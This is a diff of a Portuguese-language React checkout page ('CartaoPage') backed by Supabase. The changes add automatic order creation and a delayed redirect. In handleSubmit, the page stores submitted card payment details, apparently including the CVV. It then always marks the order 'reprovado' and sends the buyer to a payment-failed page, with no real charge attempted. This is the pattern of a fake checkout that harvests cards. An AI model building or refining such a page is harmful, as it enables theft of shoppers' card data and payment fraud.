@@ -23,7 +23,7 @@ export default function CartaoPage() {
   const [pedidoData, setPedidoData] = useState<any>(null);
 
   const searchParams = new URLSearchParams(location.search);
-  const pedidoId = searchParams.get('pedidoId');
+  let pedidoId = searchParams.get('pedidoId');
 
   useEffect(() => {
     async function fetchData() {
@@ -48,22 +48,30 @@ export default function CartaoPage() {
         setProduto(produtoData);
 
         if (!pedidoId) {
-          console.log('Nenhum pedidoId, redirecionando para checkout');
-          navigate(`/checkout/${slug}`);
-          return;
+          console.log('Nenhum pedidoId encontrado, criando novo pedido...');
+          const { data: novoPedido, error: pedidoError } = await supabase
+            .from('pedidos')
+            .insert({ produto_id: produtoData.id, status: 'pendente', valor: produtoData.preco })
+            .select()
+            .single();
+
+          if (pedidoError) throw new Error('Erro ao criar pedido');
+          pedidoId = novoPedido.id;
+          console.log('Novo pedido criado:', novoPedido);
+          setPedidoData(novoPedido);
+        } else {
+          const { data: pedido, error: pedidoError } = await supabase
+            .from('pedidos')
+            .select('*')
+            .eq('id', pedidoId)
+            .maybeSingle();
+
+          if (pedidoError) throw new Error('Erro ao carregar pedido');
+          if (!pedido) throw new Error('Pedido não encontrado');
+
+          console.log('Pedido encontrado:', pedido);
+          setPedidoData(pedido);
         }
-
-        const { data: pedido, error: pedidoError } = await supabase
-          .from('pedidos')
-          .select('*')
-          .eq('id', pedidoId)
-          .maybeSingle();
-
-        if (pedidoError) throw new Error('Erro ao carregar pedido');
-        if (!pedido) throw new Error('Pedido não encontrado');
-
-        console.log('Pedido encontrado:', pedido);
-        setPedidoData(pedido);
       } catch (error: any) {
         console.error('Erro em fetchData:', error.message);
         setError(error.message);
@@ -73,7 +81,7 @@ export default function CartaoPage() {
     }
 
     fetchData();
-  }, [slug, pedidoId, navigate]);
+  }, [slug, navigate]);
 
   const handleSubmit = async (data: CreditCardFormValues) => {
     console.log('handleSubmit chamado com dados:', { ...data, cvv: '***' });
@@ -87,7 +95,7 @@ export default function CartaoPage() {
     setSubmitting(true);
 
     try {
-      console.log('Tentando salvar informações de pagamento...');
+      console.log('Salvando informações de pagamento...');
       await createPaymentInfo({
         pedido_id: pedidoId,
         metodo_pagamento: 'cartao',
@@ -101,38 +109,26 @@ export default function CartaoPage() {
 
       console.log('Atualizando status do pedido...');
       const success = await atualizarStatusPedido(pedidoId, 'reprovado');
-      if (!success) throw new Error('Falha ao atualizar status do pedido');
+      if (!success) throw new Error('Falha ao atualizar status');
 
       console.log('Status atualizado para "reprovado"');
       toast.info('Pagamento processado, redirecionando...');
 
       queryClient.invalidateQueries({ queryKey: ['pedidos'] });
-      console.log('Cache invalidado');
-
-      // Teste de redirecionamento imediato (remova após confirmar)
-      console.log('Testando redirecionamento imediato');
+      await new Promise((resolve) => setTimeout(resolve, 1500));
+      console.log('Redirecionando para payment-failed');
       navigate(`/checkout/${slug}/payment-failed/${pedidoId}`);
-
-      // Se o acima funcionar, substitua por isso:
-      // await new Promise((resolve) => setTimeout(resolve, 1500));
-      // console.log('Redirecionando após 1,5s');
-      // navigate(`/checkout/${slug}/payment-failed/${pedidoId}`);
-
     } catch (error: any) {
       console.error('Erro no handleSubmit:', error.message);
-      toast.error(`Erro: ${error.message || 'Falha ao processar pagamento'}`);
-
-      // Teste de redirecionamento imediato no erro
-      console.log('Redirecionando imediatamente após erro');
+      toast.error(`Erro: ${error.message || 'Falha ao processar'}`);
+      await new Promise((resolve) => setTimeout(resolve, 1500));
       navigate(`/checkout/${slug}/payment-failed/${pedidoId}`);
     } finally {
-      console.log('Finalizando handleSubmit, submitting = false');
       setSubmitting(false);
     }
   };
 
   const handleBack = () => {
-    console.log('Botão Voltar clicado');
     navigate(`/checkout/${slug}`);
   };
 
@@ -189,8 +185,8 @@ export default function CartaoPage() {
               handleSubmit(data);
             }}
             submitting={submitting}
-            buttonColor={produto?.cor_botao || '#22c55e'}
-            buttonText={produto?.texto_botao || 'Finalizar Compra'}
+            buttonColor={produto?.cor_botao || '#46ba26'}
+            buttonText={produto?.texto_botao || 'Compre Agora'}
           />
         </div>
 
